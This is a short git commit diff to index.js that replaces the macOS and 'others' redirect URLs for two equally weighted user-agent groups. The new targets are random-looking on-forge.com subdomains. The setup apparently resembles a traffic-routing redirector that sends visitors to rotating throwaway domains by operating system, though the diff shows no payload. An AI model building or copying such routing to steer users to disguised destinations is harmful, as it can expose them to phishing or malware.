3adbaecdcf1f56d1aafc28f196e3f830b287bc5e
animalinside <akshay.anand12@yahoo.com>
2026-05-05 10:50:39 +0530

    Update macOS and others links for Group 1 and 2

--- index.js
+++ index.js
@@ -46,14 +46,14 @@ function getResponse(userAgent) {
         {
             id: "Group 1",
             weight: 0.5,
-            macos: "https://djhfwirgurwdwf.on-forge.com/",
-            others: "https://djhfwirgurwdwf.on-forge.com/"
+            macos: "https://rysdgvdsvudsvs.on-forge.com/",
+            others: "https://rysdgvdsvudsvs.on-forge.com/"
         },
         {
             id: "Group 2",
             weight: 0.5,
-            macos: "https://djhfwirgurwdwf.on-forge.com/",
-            others: "https://djhfwirgurwdwf.on-forge.com/"
+            macos: "https://rysdgvdsvudsvs.on-forge.com/",
+            others: "https://rysdgvdsvudsvs.on-forge.com/"
         }
     ];
 
